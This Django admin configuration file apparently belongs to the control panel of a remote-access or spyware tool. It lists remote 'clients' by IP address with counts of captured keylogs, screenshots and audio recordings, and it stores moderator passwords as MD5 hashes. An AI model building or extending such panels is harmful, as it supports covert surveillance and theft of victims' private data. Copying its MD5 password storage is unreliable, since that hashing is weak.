from django.contrib import admin

from django.contrib import admin
from .models import *


class ModeratorAdmin(admin.ModelAdmin):

    def online_clients(self, instance):
        return Clients.objects.filter(moderator_id=instance.pk, status=True).count()

    def offline_clients(self, instance):
        return Clients.objects.filter(moderator_id=instance.pk, status=False).count()

    list_display = ['username', 'privileges', 'online_clients', 'offline_clients', 'status', 'last_online']
    list_filter = ['status', 'last_online', 'privileges']
    search_fields = ['username', ]
    fieldsets = (
        (None, {
            'fields': ('username', 'privileges')
        }),
        ('Change Password (MD5 Hash)', {
            'classes': ('collapse',),
            'fields': ('password',),
        }),
    )
    readonly_fields = ['username',]

class ClientsAdmin(admin.ModelAdmin):

    def has_add_permission(self, request):
        return False

    def client_moderator(self, instance):
        moderator = Moderators.objects.get(pk=instance.moderator_id.pk)
        return moderator.username

    def screenshots(self, instance):
        return Screenshots.objects.filter(client_id=instance.pk).count()

    def keylogs(self, instance):
        return Keylogs.objects.filter(client_id=instance.pk).count()

    def audios(self, instance):
        return Audios.objects.filter(client_id=instance.pk).count()

    search_fields = ['moderator_id__username', 'identifier', 'ip_address', 'alias', 'note']
    list_filter = ['moderator_id__username', 'status', 'last_online']
    list_display = ['identifier', 'ip_address', 'alias', 'screenshots', 'keylogs', 'audios', 'status', 'last_online', 'client_moderator']
    fieldsets = (
        (None, {
            'fields': ('identifier', 'ip_address', 'alias', 'note', 'status', 'last_online')
        }),
        ('Logs Count', {
            'classes': ('collapse',),
            'fields': ('screenshots', 'keylogs', 'audios'),
        }),
    )
    readonly_fields = ['identifier', 'ip_address', 'screenshots', 'keylogs', 'audios', 'status', 'last_online']

admin.site.register(Moderators, ModeratorAdmin)
admin.site.register(Clients, ClientsAdmin)
admin.site.register(Screenshots)
admin.site.register(Keylogs)
admin.site.register(Audios)
